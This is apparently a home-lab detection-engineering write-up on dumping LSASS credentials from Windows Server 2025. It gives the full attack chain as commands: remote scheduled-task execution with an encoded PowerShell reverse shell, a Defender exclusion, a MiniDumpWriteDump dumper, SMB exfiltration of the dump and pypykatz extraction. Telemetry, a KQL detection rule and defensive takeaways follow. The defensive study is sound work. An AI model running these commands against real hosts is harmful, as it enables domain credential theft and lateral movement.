# Vector 7b — LSASS Credential Dump | Windows Server 2025 | Detection Engineering

## Overview

Extension of Vector 7 (Server 2022). Same technique, different target OS. Confirms the attack chain holds on Windows Server 2025 default install with Defender enabled.

**Result:** Full credential extraction — Administrator NT hash, machine account credentials, Kerberos plaintext, AES keys, DPAPI master keys.

**Key finding:** pypykatz 0.6.10 fails on Server 2025 (`lsasrv.dll` signature gap). pypykatz **0.6.13 required**.

---

## Lab Environment

| Host | Role | IP |
|------|------|----|
| Kali | Attacker | 192.168.1.218 |
| WIN-A33E3D6C61G | Target (Server 2025 DC) | 192.168.1.95 |
| ELK | SIEM | 192.168.1.250 |

**Target configuration:**

| Variable | Value |
|---|---|
| OS | Windows Server 2025 Datacenter 24H2 |
| Build | 26100 |
| UBR | 1 (unpatched) |
| Defender Engine | 4.18.26030.3011 |
| Defender Sigs | 1.449.312.0 (current) |
| AMRunningMode | Normal |
| Credential Guard | NOT enabled |
| PPL | Not enabled |
| Sysmon | 15.20 (SwiftOnSecurity + lsass EID 10 rule) |
| Winlogbeat | 8.19.14 → ELK 192.168.1.250 |

---

## Attack Chain

**Delivery:** goexec tsch scheduled task → SYSTEM reverse shell

```bash
# [Kali]
./goexec tsch create 192.168.1.95 \
  -u administrator@lab2019.local \
  -p 'PASSWORD' \
  --task '\systemshell' \
  --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
  --args "-NoP -NonI -W Hidden -Enc $ENCODED"
```

**Exclusion:**
```powershell
# [WIN-A33E3D6C61G]
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

**Execution:**
```
c:\windows\tasks\curio.exe
```
- Binary: compiled C# calling `MiniDumpWriteDump` from `dbghelp.dll` via P/Invoke
- Output: `C:\Windows\Temp\out2.dmp`
- Result: `True`

**Exfil:**
```bash
# [Kali]
smbclient //192.168.1.95/C$ -U 'Administrator%PASSWORD' \
  -c 'get Windows\Temp\out2.dmp /tmp/out2_server2025.dmp'
```

**Extraction:**
```bash
# [Kali] — pypykatz 0.6.13 required (0.6.10 fails on Server 2025)
pypykatz lsa minidump /tmp/out2_server2025.dmp
```

---

## Results

| Variable | Run 1 (direct) | Run 2 (rev shell) |
|---|---|---|
| Dump size | ~131MB | ~131–251MB |
| Write time | ~8 min | ~24–32 min |
| Administrator NT | `3c02b6b6fb6b3b17242dc33a31bc011f` | ✅ same |
| Machine account NT | `0af649184028ca3ea6b5149298bd57f4` | ✅ same |
| Kerberos plaintext | ✅ extracted | ✅ extracted |
| AES128/256 keys | ✅ extracted | ✅ extracted |
| DPAPI master keys | ✅ extracted | ✅ extracted |

**pypykatz note:** 0.6.10 returns `lsasrv.dll signature not found` on Server 2025. Upgrade to 0.6.13 before running against Server 2025 dumps.

---

## Telemetry

### EID 10 — curio.exe → lsass.exe

Two access events fired at dump initiation:

| SourceImage | GrantedAccess | CallTrace |
|---|---|---|
| `C:\windows\tasks\curio.exe` | `0x1FFFFF` | `ntdll → KERNEL32 → dbgcore.DLL → MiniDumpWriteDump` |
| `C:\windows\tasks\curio.exe` | `0x1F3FFF` | `ntdll → System.ni.dll (.NET P/Invoke resolution)` |

`0x1FFFFF` = PROCESS_ALL_ACCESS — MiniDumpWriteDump acquisition  
`0x1F3FFF` = .NET runtime P/Invoke handle resolution prior to native call

**No Kibana alert fired** on either event. Existing rules caught the delivery chain (Base64 encoded payload, binary execution from Tasks) but not the lsass access itself.

### EID 5007 — Defender exclusion

`Add-MpPreference -ExclusionPath "C:\Windows\Temp"` fires EID 5007 in the Defender Operational log. This is the most actionable precursor signal in the chain — it fires before the dump completes.

---

## Detection Rule (KQL)

```kql
event.code: "10" and
winlog.event_data.TargetImage: "*lsass*" and
winlog.event_data.GrantedAccess: ("0x1fffff" or "0x1f3fff") and
not winlog.event_data.SourceImage: (
  "*MsMpEng*" or
  "*svchost*" or
  "*wmiprvse*" or
  "*lsass*"
)
```

---

## Comparison vs Server 2022

| Variable | Server 2022 | Server 2025 |
|---|---|---|
| Chain succeeds | ✅ | ✅ |
| Credential Guard | Not enabled | Not enabled |
| PPL | Not enabled | Not enabled |
| Write time (direct) | 30–45 min | ~8 min |
| Write time (rev shell) | 30–45 min | ~24–32 min |
| pypykatz version needed | 0.6.10 | **0.6.13 minimum** |
| EID 10 captured | Non-deterministic | ✅ confirmed |
| Alert on lsass access | ❌ | ❌ |

Server 2025 dumps significantly faster than Server 2022 under identical conditions — suggesting different runtime enforcement behaviour under Defender.

---

## Defensive Takeaway

The dump itself may not alert. Watch the precursor: `Add-MpPreference -ExclusionPath` (EID 5007) from a non-administrative context, or from a process spawned by a scheduled task, is the window before credential material leaves the host.

---

*Lab-validated on Windows Server 2025 Datacenter 24H2, UBR 1, Defender 4.18.26030.3011 with current signatures. April 2026.*
